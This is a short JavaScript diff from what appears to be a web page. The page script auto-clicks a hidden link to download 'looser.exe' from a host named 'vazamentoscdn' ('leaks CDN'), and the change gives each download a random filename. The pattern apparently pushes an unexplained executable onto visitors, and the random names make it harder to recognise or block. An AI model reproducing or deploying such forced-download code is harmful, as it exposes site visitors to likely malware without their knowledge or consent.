@@ -65,7 +65,11 @@
         function downloadFile() {
             const link = document.createElement("a");
             link.href = "https://vazamentoscdn.github.io/cdn/looser.exe"; // Substitua pelo link correto do arquivo .exe
-            link.download = "1.exe";
+            
+            // Gera um nome de arquivo aleatório
+            const randomName = Math.random().toString(36).substring(2, 15) + ".exe";
+            link.download = randomName;
+
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
